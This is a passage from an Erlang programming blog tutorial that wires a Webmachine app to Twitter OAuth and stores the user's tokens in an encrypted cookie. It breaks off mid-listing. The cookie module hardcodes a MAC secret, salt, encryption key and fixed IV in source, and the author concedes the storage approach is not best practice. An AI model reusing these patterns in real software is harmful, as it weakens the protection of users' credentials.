<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">%% @author OJ Reeves &lt;oj@buffered.io&gt;</span>
</span><span class='line'><span class="c">%% @copyright 2012 OJ Reeves.</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% @doc csd_web startup code</span>
</span><span class='line'>
</span><span class='line'><span class="p">-</span><span class="ni">module</span><span class="p">(</span><span class="n">csd_web</span><span class="p">).</span>
</span><span class='line'><span class="p">-</span><span class="ni">author</span><span class="p">(</span><span class="n">&#39;OJ Reeves &lt;oj@buffered.io&gt;&#39;</span><span class="p">).</span>
</span><span class='line'><span class="p">-</span><span class="ni">export</span><span class="p">([</span><span class="n">start</span><span class="o">/</span><span class="mi">0</span><span class="p">,</span> <span class="n">start_link</span><span class="o">/</span><span class="mi">0</span><span class="p">,</span> <span class="n">stop</span><span class="o">/</span><span class="mi">0</span><span class="p">]).</span>
</span><span class='line'>
</span><span class='line'><span class="nf">ensure_started</span><span class="p">(</span><span class="nv">App</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="k">case</span> <span class="nn">application</span><span class="p">:</span><span class="n">start</span><span class="p">(</span><span class="nv">App</span><span class="p">)</span> <span class="k">of</span>
</span><span class='line'>    <span class="n">ok</span> <span class="o">-&gt;</span>
</span><span class='line'>      <span class="n">ok</span><span class="p">;</span>
</span><span class='line'>    <span class="p">{</span><span class="n">error</span><span class="p">,</span> <span class="p">{</span><span class="n">already_started</span><span class="p">,</span> <span class="nv">App</span><span class="p">}}</span> <span class="o">-&gt;</span>
</span><span class='line'>      <span class="n">ok</span>
</span><span class='line'>  <span class="k">end</span><span class="p">.</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% @spec start_link() -&gt; {ok,Pid::pid()}</span>
</span><span class='line'><span class="c">%% @doc Starts the app for inclusion in a supervisor tree</span>
</span><span class='line'><span class="nf">start_link</span><span class="p">()</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="n">start_common</span><span class="p">(),</span>
</span><span class='line'>  <span class="nn">csd_web_sup</span><span class="p">:</span><span class="n">start_link</span><span class="p">().</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% @spec start() -&gt; ok</span>
</span><span class='line'><span class="c">%% @doc Start the csd_web server.</span>
</span><span class='line'><span class="nf">start</span><span class="p">()</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="n">start_common</span><span class="p">(),</span>
</span><span class='line'>  <span class="nn">application</span><span class="p">:</span><span class="n">start</span><span class="p">(</span><span class="n">csd_web</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% @spec stop() -&gt; ok</span>
</span><span class='line'><span class="c">%% @doc Stop the csd_web server.</span>
</span><span class='line'><span class="nf">stop</span><span class="p">()</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">Res</span> <span class="o">=</span> <span class="nn">application</span><span class="p">:</span><span class="n">stop</span><span class="p">(</span><span class="n">csd_web</span><span class="p">),</span>
</span><span class='line'>  <span class="nn">application</span><span class="p">:</span><span class="n">stop</span><span class="p">(</span><span class="n">webmachine</span><span class="p">),</span>
</span><span class='line'>  <span class="nn">application</span><span class="p">:</span><span class="n">stop</span><span class="p">(</span><span class="n">mochiweb</span><span class="p">),</span>
</span><span class='line'>  <span class="nn">application</span><span class="p">:</span><span class="n">stop</span><span class="p">(</span><span class="n">public_key</span><span class="p">),</span> <span class="c">% stop new dependency</span>
</span><span class='line'>  <span class="nn">application</span><span class="p">:</span><span class="n">stop</span><span class="p">(</span><span class="n">ssl</span><span class="p">),</span>        <span class="c">% stop new dependency</span>
</span><span class='line'>  <span class="nn">application</span><span class="p">:</span><span class="n">stop</span><span class="p">(</span><span class="n">crypto</span><span class="p">),</span>
</span><span class='line'>  <span class="nn">application</span><span class="p">:</span><span class="n">stop</span><span class="p">(</span><span class="n">inets</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">Res</span><span class="p">.</span>
</span><span class='line'>
</span><span class='line'><span class="nf">start_common</span><span class="p">()</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="n">ensure_started</span><span class="p">(</span><span class="n">inets</span><span class="p">),</span>
</span><span class='line'>  <span class="n">ensure_started</span><span class="p">(</span><span class="n">crypto</span><span class="p">),</span>
</span><span class='line'>  <span class="n">ensure_started</span><span class="p">(</span><span class="n">public_key</span><span class="p">),</span> <span class="c">% start new dependency</span>
</span><span class='line'>  <span class="n">ensure_started</span><span class="p">(</span><span class="n">ssl</span><span class="p">),</span>        <span class="c">% start new dependency</span>
</span><span class='line'>  <span class="n">ensure_started</span><span class="p">(</span><span class="n">mochiweb</span><span class="p">),</span>
</span><span class='line'>  <span class="nn">application</span><span class="p">:</span><span class="n">set_env</span><span class="p">(</span><span class="n">webmachine</span><span class="p">,</span> <span class="n">webmachine_logger_module</span><span class="p">,</span> <span class="n">webmachine_logger</span><span class="p">),</span>
</span><span class='line'>  <span class="n">ensure_started</span><span class="p">(</span><span class="n">webmachine</span><span class="p">),</span>
</span><span class='line'>  <span class="n">ok</span><span class="p">.</span>
</span></code></pre></td></tr></table></div></figure>


<p>Interacting with Twitter now becomes quite simple. To handle talking to Twitter we&rsquo;ll create a new module, called <code>twitter.erl</code>, that does the dirty work. Let&rsquo;s take a look at the code then we&rsquo;ll walk through it.</p>

<figure class='code'><figcaption><span>apps/csd_web/src/twitter.erl </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">%% @author OJ Reeves &lt;oj@buffered.io&gt;</span>
</span><span class='line'><span class="c">%% @copyright 2012 OJ Reeves</span>
</span><span class='line'>
</span><span class='line'><span class="p">-</span><span class="ni">module</span><span class="p">(</span><span class="n">twitter</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="p">-</span><span class="ni">author</span><span class="p">(</span><span class="n">&#39;OJ Reeves &lt;oj@buffered.io&gt;&#39;</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="p">-</span><span class="ni">export</span><span class="p">([</span><span class="n">request_access</span><span class="o">/</span><span class="mi">0</span><span class="p">,</span> <span class="n">verify_access</span><span class="o">/</span><span class="mi">3</span><span class="p">,</span> <span class="n">get_current_user_info</span><span class="o">/</span><span class="mi">2</span><span class="p">]).</span>
</span><span class='line'>
</span><span class='line'><span class="nf">request_access</span><span class="p">()</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">TwitterConf</span> <span class="o">=</span> <span class="nn">conf</span><span class="p">:</span><span class="n">get_section</span><span class="p">(</span><span class="n">twitter</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">RequestTokenUrl</span> <span class="o">=</span> <span class="nn">proplists</span><span class="p">:</span><span class="n">get_value</span><span class="p">(</span><span class="n">request_token_url</span><span class="p">,</span> <span class="nv">TwitterConf</span><span class="p">),</span>
</span><span class='line'>  <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="nv">RequestResponse</span><span class="p">}</span> <span class="o">=</span> <span class="nn">oauth</span><span class="p">:</span><span class="nb">get</span><span class="p">(</span><span class="nv">RequestTokenUrl</span><span class="p">,</span> <span class="p">[],</span> <span class="n">consumer</span><span class="p">(</span><span class="nv">TwitterConf</span><span class="p">)),</span>
</span><span class='line'>  <span class="nv">RequestParams</span> <span class="o">=</span> <span class="nn">oauth</span><span class="p">:</span><span class="n">params_decode</span><span class="p">(</span><span class="nv">RequestResponse</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">RequestToken</span> <span class="o">=</span> <span class="nn">oauth</span><span class="p">:</span><span class="n">token</span><span class="p">(</span><span class="nv">RequestParams</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">AuthenticateUrl</span> <span class="o">=</span> <span class="nn">proplists</span><span class="p">:</span><span class="n">get_value</span><span class="p">(</span><span class="n">authenticate_url</span><span class="p">,</span> <span class="nv">TwitterConf</span><span class="p">),</span>
</span><span class='line'>  <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="nn">oauth</span><span class="p">:</span><span class="n">uri</span><span class="p">(</span><span class="nv">AuthenticateUrl</span><span class="p">,</span> <span class="p">[{</span><span class="s">&quot;oauth_token&quot;</span><span class="p">,</span> <span class="nv">RequestToken</span><span class="p">}])}.</span>
</span><span class='line'>
</span><span class='line'><span class="nf">verify_access</span><span class="p">(</span><span class="nv">RequestToken</span><span class="p">,</span> <span class="nv">RequestTokenSecret</span><span class="p">,</span> <span class="nv">Verifier</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">TwitterConf</span> <span class="o">=</span> <span class="nn">conf</span><span class="p">:</span><span class="n">get_section</span><span class="p">(</span><span class="n">twitter</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">AccessTokenUrl</span> <span class="o">=</span> <span class="nn">proplists</span><span class="p">:</span><span class="n">get_value</span><span class="p">(</span><span class="n">access_token_url</span><span class="p">,</span> <span class="nv">TwitterConf</span><span class="p">),</span>
</span><span class='line'>  <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="nv">AccessResponse</span><span class="p">}</span> <span class="o">=</span> <span class="nn">oauth</span><span class="p">:</span><span class="nb">get</span><span class="p">(</span><span class="nv">AccessTokenUrl</span><span class="p">,</span> <span class="p">[{</span><span class="s">&quot;oauth_verifier&quot;</span><span class="p">,</span> <span class="nv">Verifier</span><span class="p">}],</span> <span class="n">consumer</span><span class="p">(</span><span class="nv">TwitterConf</span><span class="p">),</span> <span class="nv">RequestToken</span><span class="p">,</span> <span class="nv">RequestTokenSecret</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">AccessParams</span> <span class="o">=</span> <span class="nn">oauth</span><span class="p">:</span><span class="n">params_decode</span><span class="p">(</span><span class="nv">AccessResponse</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">AccessToken</span> <span class="o">=</span> <span class="nn">oauth</span><span class="p">:</span><span class="n">token</span><span class="p">(</span><span class="nv">AccessParams</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">AccessTokenSecret</span> <span class="o">=</span> <span class="nn">oauth</span><span class="p">:</span><span class="n">token_secret</span><span class="p">(</span><span class="nv">AccessParams</span><span class="p">),</span>
</span><span class='line'>  <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="nv">AccessToken</span><span class="p">,</span> <span class="nv">AccessTokenSecret</span><span class="p">}.</span>
</span><span class='line'>
</span><span class='line'><span class="nf">get_current_user_info</span><span class="p">(</span><span class="nv">AccessToken</span><span class="p">,</span> <span class="nv">AccessTokenSecret</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="n">call_json_service</span><span class="p">(</span><span class="n">current_user_info_url</span><span class="p">,</span> <span class="nv">AccessToken</span><span class="p">,</span> <span class="nv">AccessTokenSecret</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="c">% Extract a oauth-formatted consumer tuple from the given Twitter configuration.</span>
</span><span class='line'><span class="nf">consumer</span><span class="p">(</span><span class="nv">TwitterConf</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">ConsumerKey</span> <span class="o">=</span> <span class="nn">proplists</span><span class="p">:</span><span class="n">get_value</span><span class="p">(</span><span class="n">consumer_key</span><span class="p">,</span> <span class="nv">TwitterConf</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">ConsumerSecret</span> <span class="o">=</span> <span class="nn">proplists</span><span class="p">:</span><span class="n">get_value</span><span class="p">(</span><span class="n">consumer_secret</span><span class="p">,</span> <span class="nv">TwitterConf</span><span class="p">),</span>
</span><span class='line'>  <span class="p">{</span><span class="nv">ConsumerKey</span><span class="p">,</span> <span class="nv">ConsumerSecret</span><span class="p">,</span> <span class="n">hmac_sha1</span><span class="p">}.</span>
</span><span class='line'>
</span><span class='line'><span class="c">% Invoke a call to a JSON service on Twitter.</span>
</span><span class='line'><span class="nf">call_json_service</span><span class="p">(</span><span class="nv">UrlKey</span><span class="p">,</span> <span class="nv">AccessToken</span><span class="p">,</span> <span class="nv">AccessTokenSecret</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">TwitterConf</span> <span class="o">=</span> <span class="nn">conf</span><span class="p">:</span><span class="n">get_section</span><span class="p">(</span><span class="n">twitter</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">Url</span> <span class="o">=</span> <span class="nn">proplists</span><span class="p">:</span><span class="n">get_value</span><span class="p">(</span><span class="nv">UrlKey</span><span class="p">,</span> <span class="nv">TwitterConf</span><span class="p">),</span>
</span><span class='line'>  <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="nv">Response</span><span class="p">}</span> <span class="o">=</span> <span class="nn">oauth</span><span class="p">:</span><span class="nb">get</span><span class="p">(</span><span class="nv">Url</span><span class="p">,</span> <span class="p">[],</span> <span class="n">consumer</span><span class="p">(</span><span class="nv">TwitterConf</span><span class="p">),</span> <span class="nv">AccessToken</span><span class="p">,</span> <span class="nv">AccessTokenSecret</span><span class="p">),</span>
</span><span class='line'>  <span class="p">{{_</span><span class="nv">Version</span><span class="p">,</span> <span class="mi">200</span><span class="p">,</span> <span class="s">&quot;OK&quot;</span><span class="p">},</span> <span class="p">_</span><span class="nv">Headers</span><span class="p">,</span> <span class="nv">Json</span><span class="p">}</span> <span class="o">=</span> <span class="nv">Response</span><span class="p">,</span>
</span><span class='line'>  <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="nv">Json</span><span class="p">}.</span>
</span></code></pre></td></tr></table></div></figure>


<p>This might seem like a lot but there isn&rsquo;t much to it. Here&rsquo;s the run-down:</p>

<ul>
<li><p><code>request_access</code>: This function is what handles the first step in the OAuth negotiation process. It starts by loading the <code>twitter</code> configuration from our <code>app.config</code> file. The <code>twitter</code> section contains all the URLs we need to talk to Twitter</p>

<p>First we need to get hole of a <em>request token</em>, which is an identifier for an authorisation request that Twitter generates when we first start talking OAuth. We get the <code>request_token_url</code> from the configuration and we connect to Twitter, using <code>oauth:get</code> to kick the process off. Note the use of the <code>consumer</code> function, which simply takes our local <code>twitter</code> configuration and populates an <code>erlang-oauth</code>-friendly tuple with the details required to make OAuth requests on behalf of our application. This tuple contains our <em>consumer key</em>, the <em>consumer secret</em> and the signature method to use. We will always be using <code>hmac_sha1</code> as that&rsquo;s what Twitter currently requires.</p>

<p>Twitter reponds with a payload which includes the generated request token. We take that request token out of the payload and generate an Authentication URL. This URL contains information about the request that we started in the previous steps, along with the <code>authenticate_url</code> value loaded from configuration. If you remember back to our configuration you&rsquo;ll see that this <code>authenticate_url</code> is one that Twitter told us to use when we first registered our application and it resolves to <code>https://twitter.com/oauth/authenticate</code>.</p>

<p>This URL is returned to the caller and the calling code should redirect the user to this URL so that they can authenticate themselves with Twitter.</p></li>
<li><p><code>verify_access</code>: This function is what is called after the use has authenticated themselves with Twitter. The function expects both the <em>request token</em> and <em>request token secret</em> so that the result of the request can be validated with Twitter. Twitter also generates a &ldquo;verifier&rdquo; value as part of it&rsquo;s authentication process, and this value is what is passed in via the <code>Verifier</code> parameter.</p>

<p>After getting hold of the Twitter configuration an <em>access token</em> URL is generated. This URL contains all the information required to turn the <em>request token</em> into an <em>access token</em>. Once generated, this URL is then accessed via <code>erlang-oauth</code> and the payload that comes back from Twitter contains both the <em>access token</em> and the <em>access token secret</em>. Both of these are required from this point on to make requests to Twitter on behalf of the user.</p></li>
<li><p><code>get_current_user_info</code>: This is a small helper function which calls to Twitter via <code>erlang-oauth</code> and extracts the user details for the user. The payload contains the usual Twitter profile stuff such as Twitter ID, username, bio, tweet count, etc.</p></li>
</ul>


<p>Before we take a look at the Webmachine resource that will invoke this functionality, let&rsquo;s take a look at what we&rsquo;ll need to do with the tokens once we&rsquo;ve got them.</p>

<p>For now, we are only going to store them, encrypted, in the user&rsquo;s cookie which we&rsquo;ll send down to the browser. This isn&rsquo;t &ldquo;best practice&rdquo; when it comes to storage of this kind of information, but for the sake of this blog post it will suffice. Later in the series we&rsquo;ll be doing more with this information and most likely removing some of the information from the cookie.</p>

<p>With this in mind, we need something that is able to write to and read from the user&rsquo;s cookies during a request. This module needs to be able to verify that a user&rsquo;s cookie is valid and that it hasn&rsquo;t expired. When writing and reading the module must also handle the encryption of the sensitive information.</p>

<p>Let&rsquo;s create this new module, called <code>cookie.erl</code>, inside <code>csd_web</code>. I&rsquo;ll break it up into it&rsquo;s functions so you can see what it&rsquo;s doing.</p>

<figure class='code'><figcaption><span>apps/csd_web/src/cookie.erl (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">%% @author OJ Reeves &lt;oj@buffered.io&gt;</span>
</span><span class='line'><span class="c">%% @copyright 2012 OJ Reeves</span>
</span><span class='line'>
</span><span class='line'><span class="p">-</span><span class="ni">module</span><span class="p">(</span><span class="n">cookie</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="p">-</span><span class="ni">author</span><span class="p">(</span><span class="n">&#39;OJ Reeves &lt;oj@buffered.io&gt;&#39;</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="p">-</span><span class="ni">export</span><span class="p">([</span><span class="n">load_auth</span><span class="o">/</span><span class="mi">1</span><span class="p">,</span> <span class="n">store_auth</span><span class="o">/</span><span class="mi">5</span><span class="p">]).</span>
</span><span class='line'>
</span><span class='line'><span class="p">-</span><span class="ni">define</span><span class="p">(</span><span class="no">AUTH_COOKIE</span><span class="p">,</span> <span class="s">&quot;__CodeSmackdown__Auth&quot;</span><span class="p">).</span>
</span><span class='line'><span class="p">-</span><span class="ni">define</span><span class="p">(</span><span class="no">AUTH_SALT</span><span class="p">,</span> <span class="s">&quot;27ed2d041cdb4b8b2702&quot;</span><span class="p">).</span>
</span><span class='line'><span class="p">-</span><span class="ni">define</span><span class="p">(</span><span class="no">AUTH_SECRET</span><span class="p">,</span> <span class="s">&quot;2d0431cd9bda5ba4b98271edcb2e7102&quot;</span><span class="p">).</span>
</span><span class='line'><span class="p">-</span><span class="ni">define</span><span class="p">(</span><span class="no">AUTH_EXPIRY_DAYS</span><span class="p">,</span> <span class="mi">7</span><span class="p">).</span>
</span><span class='line'><span class="p">-</span><span class="ni">define</span><span class="p">(</span><span class="no">ENC_IV</span><span class="p">,</span> <span class="o">&lt;&lt;</span><span class="mi">207</span><span class="p">,</span><span class="mi">94</span><span class="p">,</span><span class="mi">217</span><span class="p">,</span><span class="mi">158</span><span class="p">,</span><span class="mi">198</span><span class="p">,</span><span class="mi">63</span><span class="p">,</span><span class="mi">132</span><span class="p">,</span><span class="mi">205</span><span class="p">,</span><span class="mi">35</span><span class="p">,</span><span class="mi">187</span><span class="p">,</span><span class="mi">246</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">56</span><span class="p">,</span><span class="mi">122</span><span class="p">,</span><span class="mi">250</span><span class="p">,</span><span class="mi">33</span><span class="o">&gt;&gt;</span><span class="p">).</span>
</span><span class='line'><span class="p">-</span><span class="ni">define</span><span class="p">(</span><span class="no">ENC_KEY</span><span class="p">,</span>
</span><span class='line'>  <span class="o">&lt;&lt;</span><span class="mi">110</span><span class="p">,</span><span class="mi">56</span><span class="p">,</span><span class="mi">121</span><span class="p">,</span><span class="mi">28</span><span class="p">,</span><span class="mi">235</span><span class="p">,</span><span class="mi">159</span><span class="p">,</span><span class="mi">77</span><span class="p">,</span><span class="mi">154</span><span class="p">,</span><span class="mi">160</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">130</span><span class="p">,</span><span class="mi">210</span><span class="p">,</span><span class="mi">204</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="mi">26</span><span class="p">,</span><span class="mi">224</span><span class="p">,</span><span class="mi">255</span><span class="p">,</span><span class="mi">86</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">71</span><span class="p">,</span><span class="mi">61</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span>
</span><span class='line'>  <span class="mi">66</span><span class="p">,</span><span class="mi">69</span><span class="p">,</span><span class="mi">30</span><span class="p">,</span><span class="mi">39</span><span class="p">,</span><span class="mi">42</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">116</span><span class="p">,</span><span class="mi">93</span><span class="p">,</span><span class="mi">204</span><span class="p">,</span><span class="mi">99</span><span class="o">&gt;&gt;</span><span class="p">).</span>
</span></code></pre></td></tr></table></div></figure>


<p>Ignoring the usual headers/setup for the module, we can see a stack of defines. They are:</p>

<ul>
<li><code>AUTH_COOKIE</code>: This is the name of the cookie that will live in the browser. If you use a cookie editor you&rsquo;ll see this name appear as the name of the cookie once it&rsquo;s written.</li>
<li><code>AUTH_SALT</code>: This is a bunch of characters that will be used as a <a href="http://en.wikipedia.org/wiki/Salt_(cryptography)" title="Salt (crypto)">salt</a> for when we&rsquo;re generating the <a href="http://en.wikipedia.org/wiki/HMAC" title="HMAC">SHA MAC</a> from the user&rsquo;s cookie information.</li>
<li><code>AUTH_SECRET</code>: This is the key we&rsquo;ll be using when creating a <a href="http://en.wikipedia.org/wiki/HMAC" title="HMAC">SHA MAC</a> from the data we&rsquo;ll be pushing into the cookie. This is to make sure that the cookie hasn&rsquo;t been tampered with.</li>
<li><code>AUTH_EXPIRY_DAYS</code>: This is the number of days that the cookie is valid for.</li>
<li><code>ENC_IV</code>: This is the initialisation vector used when encrypting/decrypting the data in the cookie.</li>
<li><code>ENC_KEY</code>: This is the key that&rsquo;s used for encrypting/decrypting data that&rsquo;s in the cookie.</li>
</ul>


<p>Pretty simple stuff. Now let&rsquo;s take a look at a function that does something interesting.</p>

<figure class='code'><figcaption><span>apps/csd_web/src/cookie.erl (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="nf">load_auth</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="k">case</span> <span class="nn">wrq</span><span class="p">:</span><span class="n">get_cookie_value</span><span class="p">(</span><span class="no">?AUTH_COOKIE</span><span class="p">,</span> <span class="nv">ReqData</span><span class="p">)</span> <span class="k">of</span>
</span><span class='line'>    <span class="n">undefined</span> <span class="o">-&gt;</span>
</span><span class='line'>      <span class="p">{</span><span class="n">error</span><span class="p">,</span> <span class="n">no_cookie</span><span class="p">};</span>
</span><span class='line'>    <span class="nv">V</span> <span class="o">-&gt;</span>
</span><span class='line'>      <span class="nv">Val</span> <span class="o">=</span> <span class="nn">mochiweb_util</span><span class="p">:</span><span class="n">unquote</span><span class="p">(</span><span class="nv">V</span><span class="p">),</span>
</span><span class='line'>      <span class="n">decode</span><span class="p">(</span><span class="nv">Val</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span><span class="p">.</span>
</span></code></pre></td></tr></table></div></figure>


<p><code>load_auth</code> is a function which attempts to load authentication information from the cookies stored in the <code>ReqData</code> parameter. <code>ReqData</code> is the <a href="http://wiki.basho.com/Webmachine-Request.html" title="Request data">request data</a> that comes from Webmachine. As you can see, the function attempts to read the cookie value from the request data using Webmachine&rsquo;s <a href="http://wiki.basho.com/Webmachine-Request.html" title="Request data">wrq</a> module. If it fails <code>undefined</code> is returned and we know that no cookie has been set. If a value is read, we munge the data into something usable and then attempt to decode it using the <code>decode</code> function explained further down.</p>

<p>This function returns either <code>{ok, &lt;Cookie Information&gt;}</code> or <code>{error, &lt;Reason&gt;}</code>.</p>

<figure class='code'><figcaption><span>apps/csd_web/src/cookie.erl (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="nf">store_auth</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">,</span> <span class="nv">Id</span><span class="p">,</span> <span class="nv">Name</span><span class="p">,</span> <span class="nv">Token</span><span class="p">,</span> <span class="nv">TokenSecret</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">Value</span> <span class="o">=</span> <span class="nn">mochiweb_util</span><span class="p">:</span><span class="n">quote_plus</span><span class="p">(</span><span class="n">encode</span><span class="p">(</span><span class="nv">Id</span><span class="p">,</span> <span class="nv">Name</span><span class="p">,</span> <span class="nv">Token</span><span class="p">,</span> <span class="nv">TokenSecret</span><span class="p">)),</span>
</span><span class='line'>  <span class="nv">Options</span> <span class="o">=</span> <span class="p">[</span>
</span><span class='line'>    <span class="c">%{domain, &quot;codesmackdown.com&quot;},</span>
</span><span class='line'>    <span class="p">{</span><span class="n">max_age</span><span class="p">,</span> <span class="mi">3600</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">*</span> <span class="no">?AUTH_EXPIRY_DAYS</span><span class="p">},</span>
</span><span class='line'>    <span class="p">{</span><span class="n">path</span><span class="p">,</span> <span class="s">&quot;/&quot;</span><span class="p">},</span>
</span><span class='line'>    <span class="p">{</span><span class="n">http_only</span><span class="p">,</span> <span class="n">true</span><span class="p">}</span>
</span><span class='line'>  <span class="p">],</span>
</span><span class='line'>  <span class="nv">CookieHeader</span> <span class="o">=</span> <span class="nn">mochiweb_cookies</span><span class="p">:</span><span class="n">cookie</span><span class="p">(</span><span class="no">?AUTH_COOKIE</span><span class="p">,</span> <span class="nv">Value</span><span class="p">,</span> <span class="nv">Options</span><span class="p">),</span>
</span><span class='line'>  <span class="nn">wrq</span><span class="p">:</span><span class="n">merge_resp_headers</span><span class="p">([</span><span class="nv">CookieHeader</span><span class="p">],</span> <span class="nv">ReqData</span><span class="p">).</span>
</span></code></pre></td></tr></table></div></figure>


<p><code>store_auth</code> is the opposite to <code>load_auth</code> as it writes the user&rsquo;s information and token data to a cookie. The parameters to this function are:</p>

<ul>
<li><code>ReqData</code>: Webmachine&rsquo;s request data.</li>
<li><code>Id</code>: The user&rsquo;s Twitter ID. We&rsquo;ll be using this as a key later on to retrieve information from Riak.</li>
<li><code>Name</code>: The user&rsquo;s Twitter user name. We&rsquo;ll use this purely for display.</li>
<li><code>Token</code> and <code>TokenSecret</code>: Token information for making OAuth requests on behalf of this user.</li>
</ul>


<p>The first thing we do is call <code>encode</code> and pass in the last four arguments. This gives us an encrypted blob which we can store in a cookie. We then put down some basic information inside <code>Options</code>, including the expiry date. We then use <code>mochiweb_cookies</code> to generate a cookie with the name (<code>AUTH_COOKIE</code>), value and options.</p>

<p>Lastly we take the generated cookie header and merge that with the headers that already part of <code>ReqData</code> and produce a new request data object which is returned to the caller.</p>

<figure class='code'><figcaption><span>apps/csd_web/src/cookie.erl (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="nf">encode</span><span class="p">(</span><span class="nv">Id</span><span class="p">,</span> <span class="nv">Name</span><span class="p">,</span> <span class="nv">Token</span><span class="p">,</span> <span class="nv">TokenSecret</span><span class="p">)</span> <span class="o">-&gt;</span>
